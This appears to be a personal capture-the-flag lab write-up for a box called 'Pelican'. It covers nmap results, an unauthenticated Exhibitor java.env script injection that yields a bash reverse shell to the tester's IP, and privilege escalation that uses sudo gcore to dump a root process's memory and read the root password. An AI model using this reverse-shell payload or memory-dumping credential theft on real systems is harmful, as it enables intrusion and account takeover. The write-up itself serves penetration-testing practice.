My IP:  192.168.45.166
Target IP:  192.168.111.98
nmap:
```
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 a8:e1:60:68:be:f5:8e:70:70:54:b4:27:ee:9a:7e:7f (RSA)
|   256 bb:99:9a:45:3f:35:0b:b3:49:e6:cf:11:49:87:8d:94 (ECDSA)
|_  256 f2:eb:fc:45:d7:e9:80:77:66:a3:93:53:de:00:57:9c (ED25519)
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
631/tcp   open  ipp         CUPS 2.2
|_http-server-header: CUPS/2.2 IPP/2.1
|_http-title: Forbidden - CUPS v2.2.10
| http-methods: 
|_  Potentially risky methods: PUT
2181/tcp  open  zookeeper   Zookeeper 3.4.6-1569965 (Built on 02/20/2014)
2222/tcp  open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 a8:e1:60:68:be:f5:8e:70:70:54:b4:27:ee:9a:7e:7f (RSA)
|   256 bb:99:9a:45:3f:35:0b:b3:49:e6:cf:11:49:87:8d:94 (ECDSA)
|_  256 f2:eb:fc:45:d7:e9:80:77:66:a3:93:53:de:00:57:9c (ED25519)
8080/tcp  open  http        Jetty 1.0
|_http-title: Error 404 Not Found
|_http-server-header: Jetty(1.0)
8081/tcp  open  http        nginx 1.14.2
|_http-title: Did not follow redirect to http://192.168.111.98:8080/exhibitor/v1/ui/index.html
|_http-server-header: nginx/1.14.2
34051/tcp open  java-rmi    Java RMI
Service Info: Host: PELICAN; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h20m00s, deviation: 2h18m34s, median: 0s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-06-21T00:45:58
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: pelican
|   NetBIOS computer name: PELICAN\x00
|   Domain name: \x00
|   FQDN: pelican
|_  System time: 2026-06-20T20:46:00-04:00
```

SSH: Can be potentially used for connecting to users and sending things too and from users
- Needs creds

HTTP(8080 & 8081): Lets browse and see what we can observe on the webpage.
- Error page on 8080
- 8081 has 
Was able to obtain a rev shell on user charles due to a RCE exploin with the java.env script runner. 

SMB
- lets try to connect anonymously 


Application Service (Zookeeper 3.4.6)
- search for vulns online

---

## Service Fingerprint — Exhibitor on top of ZooKeeper

The interesting stack is **three layers** (see the product-vs-service idea):
- `2181` = **ZooKeeper 3.4.6** — the data store (the *service* nmap names)
- `8080` = **Exhibitor** (Jetty) — a separate product that *manages* ZooKeeper via a web UI
- `8081` = nginx, just **redirects to** `http://...:8080/exhibitor/v1/ui/index.html`

→ The real target is **Exhibitor** (the layer *above* ZooKeeper), and its UI is exposed with **no auth**. That web UI is the foothold, not ZooKeeper itself.

---

## Foothold — Exhibitor java.env Script Injection (RCE as `charles`)

Full steps in [[Exhibitor-ZooKeeper-RCE-to-Root]]. Short version:
1. Exhibitor UI → **Config** tab → set the `java.env script` field to:
```bash
export JAVA_OPTS="-Xms1000m -Xmx1000m"
/bin/bash -i >& /dev/tcp/192.168.45.166/8080 0>&1
```
2. **Commit** → **Control Panel** → **Restart** → shell catches on `nc -lvnp 8080`.

> The `export JAVA_OPTS` line is mandatory — without it the JVM crashes on restart and the shell never fires. Callback on **8080** (a known-open port) sailed through. Landed as **`charles`**.

### Post-foothold gotchas (real time-wasters this box)
- **`curl` is not installed** (`curl: command not found`) → use `wget` for all transfers here.
- **`wget` URL typo** — `wget http://IP:8000 linpeas.sh -O ...` (space instead of `/`) made wget fetch the *directory index* and then the real `linpeas.sh` *website*, saving HTML. Running it gave `syntax error near 'newline' '<!DOCTYPE HTML>'`. Fix: `wget http://192.168.45.166:8000/linpeas.sh -O /tmp/linpeas.sh` and **`file`/`head` the download before running it.**

---

## Privesc — `sudo gcore` → root process memory → root password

Reusable primitive in [[Linux_Priv_Esc]] (Sudo Abuse → gcore). What happened here:

1. `sudo -l`:
```
User charles may run the following commands on pelican:
    (ALL) NOPASSWD: /usr/bin/gcore
```
2. linpeas **Running processes** showed a custom root process: `root 494 /usr/bin/password-store` (also SUID + `@reboot` cron — clearly placed on purpose). The name says what it holds.
3. Dump its memory as root and read it:
```bash
pgrep -a password-store                       # confirm the live PID (was 494)
sudo gcore -a -o /tmp/dump 494                # writes /tmp/dump.494 (readable by me)
strings /tmp/dump.494 | grep -i -A3 'Password'
# 001 Password: root:
# <root password on the following line>
```
4. `su -` with that password → **root**.

> `strings | grep -i -A3` mattered: the password sat on the line *after* the `Password: root:` label, so a plain `grep password` (no context, no `-i`) missed it. Don't `cat` the core file — it's binary; use `strings`. See [[Linux_Common_Commands]] (Reading Binary Files & Dumps).

> SSH as root was off (`PermitRootLogin no`), so `su -` from the `charles` shell was the way in — not `ssh root@`.

---

## Result

- Foothold: **`charles`** via Exhibitor java.env RCE.
- Root: **`su -`** with the password recovered from the `password-store` core dump (no kernel exploit needed).

## Key Takeaways

1. **Find the product on top, not just the protocol.** ZooKeeper (2181) was the data store; **Exhibitor** was the exploitable product managing it. The vuln lived in the upper layer.
2. **`sudo -l` + a custom root process = look at memory.** A NOPASSWD memory/file reader (`gcore`) aimed at a root process holding secrets is a clean, exploit-free root.
3. **Running processes hold secrets in plaintext RAM** — dump + `strings`, no cracking.
4. **`strings | grep -i -A3`** — context + case-insensitive, every time. The value hides next to the label, not on it.
5. **No `curl`? Use `wget`** — and always `file`/`head` a download before executing it (an HTML error page saved as `.sh` fails with a line-1 syntax error).
